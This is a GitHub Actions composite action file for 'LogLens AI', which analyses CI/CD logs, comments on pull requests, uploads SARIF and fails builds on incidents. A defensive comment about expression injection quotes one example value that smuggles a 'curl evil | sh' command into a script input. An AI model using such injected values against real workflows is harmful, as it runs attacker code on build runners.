name: "LogLens AI"
description: "Detect and explain anomalies in your CI/CD logs, comment on PRs, upload SARIF, and fail the build on real incidents. Local & open-source."
author: "LogLens AI"
branding:
  icon: "search"
  color: "blue"

inputs:
  source:
    description: "Log file(s) to analyze. A path, a glob (logs/*.log), or a newline/comma-separated list."
    required: true
  fail-on:
    description: "Fail the job if an anomaly is this severity or worse: critical | error | warning | fatal | any. Empty = report only."
    required: false
    default: ""
  mode:
    description: "Detection mode: fast | turbo | deep."
    required: false
    default: "fast"
  min-score:
    description: "Only report anomalies with score >= this (0-1). 0 = report all."
    required: false
    default: "0"
  limit:
    description: "Max anomalies to list per file in the job summary / comment."
    required: false
    default: "25"
  comment-on-pr:
    description: "Post/update a sticky summary comment on the pull request (true/false). Needs pull-requests: write."
    required: false
    default: "false"
  sarif:
    description: "Emit a SARIF file and upload it to the Security tab (true/false). Needs security-events: write."
    required: false
    default: "false"
  upload-report:
    description: "Upload the aggregated JSON report as a build artifact (true/false)."
    required: false
    default: "false"
  report-name:
    description: "Artifact name for the uploaded JSON report."
    required: false
    default: "loglens-report"
  version:
    description: "loglensai version to install (e.g. 0.13.0). Empty = latest on PyPI."
    required: false
    default: ""
  python-version:
    description: "Python version to run on."
    required: false
    default: "3.12"

outputs:
  anomaly-count:
    description: "Total number of anomalies found across all analyzed files."
    value: ${{ steps.loglens.outputs.anomaly-count }}
  incident:
    description: "'true' if any file tripped the incident flag, else 'false'."
    value: ${{ steps.loglens.outputs.incident }}
  report-json:
    description: "Path to the aggregated JSON report (when upload-report is enabled)."
    value: ${{ steps.loglens.outputs.report-json }}

runs:
  using: "composite"
  steps:
    # Security: inputs are passed to shell steps ONLY through `env:` and always
    # quoted. Never write ${{ inputs.* }} (or other expressions a workflow can
    # feed with untrusted data) directly inside a `run:` script — the runner
    # pastes it into the script source before bash runs, so a value such as
    # x"; curl evil | sh; echo " would execute.
    - name: Validate inputs
      shell: bash
      env:
        INPUT_SOURCE: ${{ inputs.source }}
        INPUT_MODE: ${{ inputs.mode }}
        INPUT_FAIL_ON: ${{ inputs.fail-on }}
        INPUT_MIN_SCORE: ${{ inputs.min-score }}
        INPUT_LIMIT: ${{ inputs.limit }}
        INPUT_VERSION: ${{ inputs.version }}
      run: |
        # Messages name the bad input but never echo its value: printing an
        # untrusted value could itself inject a workflow command.
        fail() { echo "::error title=LogLens AI::$1"; exit 1; }
        [ -n "$INPUT_SOURCE" ] || fail "Input 'source' is required."
        mode=$(printf '%s' "$INPUT_MODE" | tr '[:upper:]' '[:lower:]')
        case "$mode" in
          fast|turbo|deep) ;;
          *) fail "Invalid 'mode' input. Use one of: fast, turbo, deep." ;;
        esac
        fail_on=$(printf '%s' "$INPUT_FAIL_ON" | tr '[:upper:]' '[:lower:]')
        case "$fail_on" in
          ""|none|emergency|alert|fatal|critical|error|warning|warn|any) ;;
          *) fail "Invalid 'fail-on' input. Use one of: critical, error, warning, fatal, emergency, alert, any (or leave empty)." ;;
        esac
        score_re='^(0|1|0?\.[0-9]+|1\.0+)$'
        [[ "$INPUT_MIN_SCORE" =~ $score_re ]] || fail "Invalid 'min-score' input. Use a number from 0 to 1, e.g. 0.7."
        limit_re='^[0-9]{1,6}$'
        [[ "$INPUT_LIMIT" =~ $limit_re ]] || fail "Invalid 'limit' input. Use a whole number, e.g. 25."
        if [ -n "$INPUT_VERSION" ]; then
          version_re='^[0-9]+(\.[0-9]+)*([a-zA-Z0-9.+-]*)$'
          [[ "$INPUT_VERSION" =~ $version_re ]] || fail "Invalid 'version' input. Use a release number, e.g. 0.13.1."
        fi

    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: ${{ inputs.python-version }}

    - name: Install LogLens AI
      shell: bash
      env:
        INPUT_VERSION: ${{ inputs.version }}
      run: |
        python -m pip install --upgrade pip
        if [ -n "$INPUT_VERSION" ]; then
          pip install "loglensai==${INPUT_VERSION}"
        else
          pip install loglensai
        fi

    - name: Analyze logs
      id: loglens
      shell: bash
      env:
        ACTION_PATH: ${{ github.action_path }}
        INPUT_SOURCE: ${{ inputs.source }}
        INPUT_MODE: ${{ inputs.mode }}
        INPUT_FAIL_ON: ${{ inputs.fail-on }}
        INPUT_MIN_SCORE: ${{ inputs.min-score }}
        INPUT_LIMIT: ${{ inputs.limit }}
        INPUT_SARIF: ${{ inputs.sarif }}
        INPUT_COMMENT_ON_PR: ${{ inputs.comment-on-pr }}
        INPUT_UPLOAD_REPORT: ${{ inputs.upload-report }}
      run: |
        set +e
        mode=$(printf '%s' "$INPUT_MODE" | tr '[:upper:]' '[:lower:]')
        extra=()
        [ "$INPUT_SARIF" = "true" ] && extra+=(--sarif loglens.sarif)
        [ "$INPUT_COMMENT_ON_PR" = "true" ] && extra+=(--comment-file loglens-comment.md)
        [ "$INPUT_UPLOAD_REPORT" = "true" ] && extra+=(--report-json loglens-report.json)
        python "$ACTION_PATH/ci/gh_analyze.py" \
          --source "$INPUT_SOURCE" \
          --mode "$mode" \
          --fail-on "$INPUT_FAIL_ON" \
          --min-score "$INPUT_MIN_SCORE" \
          --limit "$INPUT_LIMIT" \
          "${extra[@]}"
        echo "exit-code=$?" >> "$GITHUB_OUTPUT"

    - name: Upload SARIF to the Security tab
      if: always() && inputs.sarif == 'true' && hashFiles('loglens.sarif') != ''
      uses: github/codeql-action/upload-sarif@v3
      with:
        sarif_file: loglens.sarif
        category: loglens-ai

    - name: Comment on the pull request
      if: always() && inputs.comment-on-pr == 'true' && github.event_name == 'pull_request' && hashFiles('loglens-comment.md') != ''
      shell: bash
      env:
        GH_TOKEN: ${{ github.token }}
        PR_NUMBER: ${{ github.event.pull_request.number }}
        REPO: ${{ github.repository }}
      run: |
        marker="<!-- loglens-ai-report -->"
        pr="$PR_NUMBER"
        repo="$REPO"
        existing=$(gh api "repos/$repo/issues/$pr/comments" \
          --jq "map(select(.body | startswith(\"$marker\"))) | .[0].id // empty" 2>/dev/null || true)
        if [ -n "$existing" ]; then
          gh api -X PATCH "repos/$repo/issues/comments/$existing" -F body=@loglens-comment.md >/dev/null \
            && echo "Updated existing LogLens PR comment."
        else
          gh api -X POST "repos/$repo/issues/$pr/comments" -F body=@loglens-comment.md >/dev/null \
            && echo "Posted LogLens PR comment."
        fi

    - name: Upload JSON report artifact
      if: always() && inputs.upload-report == 'true' && hashFiles('loglens-report.json') != ''
      uses: actions/upload-artifact@v4
      with:
        name: ${{ inputs.report-name }}
        path: loglens-report.json
        if-no-files-found: ignore

    - name: Enforce fail-on gate
      if: always()
      shell: bash
      env:
        EXIT_CODE: ${{ steps.loglens.outputs.exit-code }}
        INPUT_FAIL_ON: ${{ inputs.fail-on }}
      run: |
        code="$EXIT_CODE"
        if [ "${code:-0}" != "0" ]; then
          # fail-on is allow-listed by "Validate inputs" before analysis can run.
          echo "::error::LogLens failed the build (fail-on='${INPUT_FAIL_ON}', exit $code)."
          exit 1
        fi
